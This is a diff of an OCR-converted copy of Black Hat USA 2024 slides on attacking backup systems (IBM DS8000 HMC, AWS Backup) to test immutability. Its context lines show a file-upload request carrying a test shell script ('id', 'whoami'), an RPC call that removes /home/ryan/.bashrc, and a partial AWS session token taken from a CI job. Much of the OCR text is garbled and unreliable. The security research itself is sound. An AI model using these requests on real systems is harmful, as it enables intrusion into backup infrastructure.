@@ -21,7 +21,6 @@ converted_at: "2026-08-11T21:38:25Z"
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Ryan Kane & Rushank Shetty_Are Your Backups Still Immutable, Even Though You Can't Access Them.pdf` (48 pages)
 
-
 ## Slide 1
 
 **Are Your Backups Still Immutable, Even Though You Can't Access Them?**
@@ -408,13 +407,11 @@ i f) Updates
 | Ej Guided Setup Wizard Provides a step-by-step process to configure your HMC.
 |
 a
-5 if HT f he HMC v 4
 r ie peat and configuring the eve guide Provides an online version of Installing and configuring the HMC v8 guide for system administrators and system operators using the HMC
 : View as HTML
 ; @) ae ine RC ve mute Provides an online version of Managing the HMC v8 guide for system administrators and system operators using the HMC
 View as HIML
 4
-/ he HMC v:
 | 2) soning ue eve guide Provides an online version of Servicing the HMC v8 guide for system administrators and system operators using the HMC.
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
@@ -433,7 +430,6 @@ o OK
 S)
 There was an internal error processing the request.
 ACT@85@2E
-ae cs Fel Date al = mm —
 = OA = https:/)_ onl ‘/hme/content?taskld=657 &refresh= 1405
 Back
 Enter the file name and click OK. The file must exist on the console.
@@ -464,7 +460,6 @@ Pretty Raw Hex
 iS |------ WebKitFormBoundaryiamSt8shpSNLI4RP
 24 Content-Disposition: form-data; name="DSCLIFileInput";| filename="ast.sh"|| —
 5 Content-Type: text/x-sh :
-Ses ae ©
 SS #!/bin/bash =
 id
 whoami
@@ -562,12 +557,9 @@ at
 "methodName": "removeScript", =
 "“methodArgs":| a
 "7home/ryan/.bashrc" Se ee
-] = & ¥ “ ae a -
-} i Sa
 _ Response a eae
 NK tea ; Pretty Raw Hex Render fas
 E has, 114
-ae 15 {
 2 "clazz":"com.ibm.evo.rpc.RPCResponse",
 "messages":[
 >
@@ -716,18 +708,11 @@ Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 >
 "LastUpdated" : "2023-12-05T17:34:19Z",
 "Type" : "AWS-HMAC",
 "AccessKeyId" : mo ee
-"SecretAccessKey" : i | EE mo 8 2 =
 "Token" : "IQoJb3JpZ2LuX2VjEBLaCXVZLWVhc3QtMSJGMEQCICIAUJNWEBVMOXrxUuzCSwTeOcVui4Y1ZmawIShQy7APAiBk/LqROQAtFh2PTGSF3fgF4
-a a MEE EEN EES ES ee EEE = | 8. oe m= 8 |
-T i > ie | a nn | | a 8 | a = oe 6 BH: 8
-ae an [asl = a a a ba = m8 ee ee
 |
-na 8 == i ood ae = a _* cose emeee
-a | ao oe Se LL:
 picky ke ueees {heat dye
 |
 = =
-el i ee eo Le
 "Expiration" : "2023-12-05T23:51:55Z"
 }
 Vv 69 Cleaning up project directory and file based variables
@@ -759,7 +744,6 @@ perties (4) Actions (2) Tags (6) Insight Findings
 7 Principal":
 8
 9 “arn:aws: iam: 3: ro le /-deployer",
-10 “arn:aws: iam: : 6S : ro le / I —runner-prod"
 11
 12 }
 13 }
